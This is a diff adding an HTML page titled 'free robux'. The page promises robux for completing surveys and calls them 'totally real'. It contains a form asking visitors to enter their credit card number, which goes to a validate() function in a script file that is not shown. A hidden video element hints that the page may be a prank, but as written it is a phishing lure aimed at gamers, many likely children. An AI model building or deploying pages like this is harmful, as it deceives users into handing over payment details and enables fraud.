@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>free robux</title>
+  <script src="script.js"></script>
+  <link href="style.css" rel="stylesheet" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <nav>
+    <a href="#loading">Home</a>
+    <a href="#about">About</a>
+  </nav>
+
+  <div id="loading">Loading surveys...</div>
+  <div id="start" style="display: none">Click me to begin the survey(s) for 15 robux</div>
+  <div id="data"></div>
+  <video id="video" playingline style="display: none; pointer-events: none"></video>
+
+  <div id="about">
+    <h2>About Our Surveys</h2>
+    <p>These are totally real surveys for free robux!</p>
+  </div>
+  <div id="formContainer" class="form-container">
+    <div class="form-card">
+        <label for="card">Enter your credit card info (no space, no dash):</label>
+        <input type="text" id="card" name="card">
+        <button onclick="validate(document.getElementById('card').value)">Submit</button>
+    </div>
+  </div>
+
+</body>
+
+</html>
